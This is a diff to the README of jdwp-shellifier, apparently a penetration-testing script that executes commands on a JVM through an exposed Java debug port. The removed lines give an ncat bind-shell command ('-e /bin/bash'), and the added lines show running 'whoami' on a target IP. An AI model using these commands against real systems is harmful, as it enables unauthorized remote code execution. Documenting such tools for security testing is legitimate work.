@@ -22,23 +22,9 @@ Well, in a pretty standard way, the script only requires a Python 2 interpreter:
     	--cmd COMMAND         Specify full path to method to break on (default:
     		None)
 
-To target a specific host/port:
+## What is new ?
+Specify `java.lang.String.indexOf` method to break on and echo the command execution result:
 
-	$ python ./jdwp-shellifier.py -t my.target.ip -p 1234
-	
-This command will only inject Java code on the JVM and show some info like Operating System, Java version. Since it does not execute external code/binary, it is totally safe and can be used as Proof-Of-Concept
+	$ python2 jdwp-shellifier.py -t 192.168.182.130 -p 8000 --break-on "java.lang.String.indexOf" --cmd "whoami"
 
-	$ python ./jdwp-shellifier.py -t my.target.ip -p 1234 --cmd "ncat -v -l -p 1234 -e /bin/bash"
-	
-This command will actually execute the process `ncat` with the specified argument with the rights given to the running JVM.
-
-Before sending questions, make sure to read http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html for full understanding of the JDWP protocol. 
-
-## Thanks
-* Ilja Van Sprundel
-* Sebastien Macke
-
-
-
-
-
+![](./result.png)
